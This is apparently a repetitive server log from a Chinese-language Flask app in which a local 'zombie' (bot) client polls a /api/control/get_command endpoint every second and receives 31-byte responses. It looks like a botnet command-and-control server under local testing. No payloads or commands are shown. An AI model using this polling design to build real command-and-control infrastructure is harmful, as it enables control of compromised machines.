2025-06-25 11:29:10 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:29:10] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:29:11 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:29:11 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:29:11 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:29:11 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:29:11] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:29:12 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:29:12 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:29:12 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0014s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:29:12 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:29:12] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:29:13 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:29:13 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:29:13 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:29:13 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:29:13] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:29:14 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:29:14 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:29:14 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:29:14 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:29:14] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:29:15 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:29:15 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:29:15 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:29:15 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:29:15] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:29:16 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:29:16 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:29:16 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:29:16 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:29:16] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:29:17 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:29:17 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:29:17 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:29:17 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:29:17] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:29:18 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:29:18 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:29:18 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0014s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:29:18 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:29:18] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:29:19 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:29:19 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:29:19 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:29:19 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:29:19] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:29:20 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:29:20 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:29:20 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:29:20 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:29:20] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:29:21 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:29:21 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:29:21 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:29:21 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:29:21] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:29:22 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:29:22 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:29:22 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:29:22 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:29:22] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:29:23 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:29:23 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:29:23 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:29:23 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:29:23] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:29:24 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:29:24 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:29:24 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:29:24 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:29:24] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:29:25 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:29:25 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:29:25 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:29:25 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:29:25] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:29:26 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:29:26 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:29:26 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:29:26 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:29:26] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:29:27 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:29:27 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:29:27 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:29:27 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:29:27] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:29:28 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:29:28 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:29:28 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:29:28 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:29:28] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:29:29 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:29:29 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:29:29 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0013s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:29:29 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:29:29] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:29:30 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:29:30 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:29:30 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:29:30 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:29:30] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:29:31 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:29:31 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:29:31 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0013s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:29:31 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:29:31] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:29:32 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:29:32 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:29:32 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:29:32 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:29:32] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:29:33 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:29:33 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:29:33 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:29:33 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:29:33] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:29:34 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:29:34 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:29:34 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:29:34 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:29:34] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:29:35 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:29:35 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:29:35 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:29:35 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:29:35] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:29:36 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:29:36 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:29:36 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:29:36 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:29:36] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:29:37 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:29:37 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:29:37 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0014s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:29:37 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:29:37] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:29:38 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:29:38 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:29:38 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:29:38 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:29:38] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:29:39 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:29:39 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:29:39 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0021s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:29:39 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:29:39] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:29:40 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:29:40 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:29:40 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:29:40 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:29:40] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:29:41 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:29:41 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:29:41 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0013s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:29:41 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:29:41] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:29:42 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:29:42 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:29:42 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0015s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:29:42 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:29:42] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:29:43 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:29:43 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:29:43 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:29:43 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:29:43] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:29:44 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:29:44 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:29:44 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0013s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:29:44 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:29:44] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:29:45 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:29:45 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:29:45 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:29:45 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:29:45] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:29:46 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:29:46 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:29:46 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:29:46 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:29:46] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:29:47 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:29:47 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:29:47 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0015s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:29:47 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:29:47] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:29:48 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:29:48 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:29:48 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:29:48 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:29:48] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:29:49 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:29:49 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:29:49 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:29:49 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:29:49] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:29:50 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:29:50 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:29:50 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:29:50 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:29:50] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:29:51 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:29:51 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:29:51 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:29:51 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:29:51] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:29:52 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:29:52 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:29:52 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:29:52 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:29:52] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:29:53 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:29:53 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:29:53 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0017s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:29:53 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:29:53] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:29:54 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:29:54 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:29:54 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:29:54 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:29:54] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:29:55 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:29:55 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:29:55 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0005s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:29:55 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:29:55] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:29:56 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:29:56 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:29:56 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:29:56 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:29:56] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:29:57 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:29:57 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:29:57 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:29:57 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:29:57] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:29:58 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:29:58 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:29:58 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:29:58 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:29:58] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:29:59 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:29:59 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:29:59 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:29:59 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:29:59] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:30:00 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:30:00 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:30:00 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:30:00 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:30:00] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:30:01 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:30:01 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:30:01 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:30:01 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:30:01] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:30:02 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:30:02 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:30:02 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 31 bytes [200 OK]>
